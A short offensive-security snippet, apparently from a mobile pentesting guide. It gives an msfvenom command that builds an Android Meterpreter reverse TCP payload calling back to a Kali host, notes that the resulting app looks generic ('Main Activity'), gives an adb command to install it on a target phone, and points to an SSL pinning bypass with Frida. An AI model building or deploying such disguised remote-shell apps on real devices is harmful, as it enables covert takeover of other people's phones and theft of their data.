
**msfvenom -p android/meterpreter/reverse_tcp LHOST=<kali_IP> LPORT=<your_port> R> -o <myapp.apk>**

This will make an app with a generic looking icon named "Main Activity"

Install it to your target phone: adb install myapp.apk

Create key as mentioned in SSL Pinning ByPass via Frida